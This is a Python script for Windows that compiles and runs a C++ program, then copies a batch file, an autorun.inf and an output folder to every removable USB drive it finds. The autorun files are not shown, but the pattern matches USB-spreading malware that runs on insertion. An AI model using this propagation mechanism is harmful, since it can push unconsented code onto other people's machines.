import os
import shutil
import string
import subprocess
import win32api
import win32file


def find_usb_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    usb_drives = []

    for drive in drives:
        drive_type = win32file.GetDriveType(drive)
        if drive_type == win32file.DRIVE_REMOVABLE:
            usb_drives.append(drive)

    return usb_drives


def compile_cpp_scripts():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    cpp_file = os.path.join(script_dir, 'complier', 'CompileAllFiles.cpp')
    output_dir = os.path.join(script_dir, 'output')

    try:
        subprocess.check_call(['g++', cpp_file, '-o', 'compile.exe'])
        subprocess.check_call(['compile.exe'])
        print('Compilation and execution completed successfully')
    except subprocess.CalledProcessError as e:
        print(f'Error occurred during compilation or execution: {e}')
    finally:
        if os.path.exists('compile.exe'):
            os.remove('compile.exe')


def copy_files_to_usb(usb_drive):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    source_files = [
        os.path.join(script_dir, 'run_all.bat'),
        os.path.join(script_dir, 'autorun.inf')
    ]
    source_folder = os.path.join(script_dir, 'output')
    destination_folder = os.path.join(usb_drive, 'output')

    try:
        for source_file in source_files:
            shutil.copy(source_file, usb_drive)
        shutil.copytree(source_folder, destination_folder)

        print(f'Files copied to: {usb_drive}')
    except Exception as e:
        print(f'Failed to copy files to {usb_drive}: {e}')


def main():
    compile_cpp_scripts()

    usb_drives = find_usb_drives()
    print(f'USB drives found: {usb_drives}')

    for usb_drive in usb_drives:
        copy_files_to_usb(usb_drive)


if __name__ == '__main__':
    main()
